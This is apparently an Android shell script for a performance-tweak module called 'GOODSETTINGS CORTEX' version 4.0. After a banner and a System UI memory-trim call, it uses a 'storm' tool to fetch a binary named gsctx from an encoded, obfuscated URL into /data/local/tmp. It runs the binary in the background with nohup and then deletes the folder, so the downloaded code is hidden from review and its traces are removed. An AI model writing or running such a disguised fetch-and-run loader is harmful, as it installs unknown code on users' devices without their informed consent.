$AXFUN
COLOR_LIGHT_GREEN="\033[0;32m"
COLOR_RED="\e[0;31m"
LK="https://linktr.ee/henvxofficial"
BIN="/data/local/tmp/goodsettings/"
URL="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC2ums2IqQOI0rN5e
tp9kPNclC2Agsz9es2Hlt2x="
printf() {
	text="$1"
	color="$2"
	i=0
	while [ $i -lt ${#text} ]; do
		echo -en "\e[${color}m${text:$i:1}\e[0m"
		sleep 0.02
		i=$((i + 1))
	done
	echo
}
if [ ! -d "$BIN" ]; then
	mkdir -p "$BIN"
fi
sleep 1
echo ""
echo "
█▀▀ █▀█ █▀█ █▀▄ █▀ █▀▀ ▀█▀ ▀█▀ █ █▄░█ █▀▀ █▀
█▄█ █▄█ █▄█ █▄▀ ▄█ ██▄ ░█░ ░█░ █ █░▀█ █▄█ ▄█"
echo ""

sleep 2
printf "GOODSETTINGS CORTEX - $architecture"
printf "Version : 4.0"
echo ""

sleep 2
echo ""

am send-trim-memory --user 0 com.android.systemui RUNNING_CRITICAL >/dev/null 2>&1

status=$(pgrep -f gsctx) >/dev/null 2>&1
if [ ! "$status" ]; then
	storm -rP "$BIN" -s "${URL}" -fn "gsctx" "$@"
	nohup /data/local/tmp/goodsettings/gsctx >/dev/null 2>&1 &
	rm -rf $BIN
fi

sleep 2

status=$(pgrep -f gsctx) >/dev/null 2>&1
if [ "$status" ]; then
	echo "INFORMATION | ${COLOR_LIGHT_GREEN}running in the background."
else
	echo "INFORMATION | ${COLOR_RED}failed running. "
fi
sleep 3
echo ""
echo ""
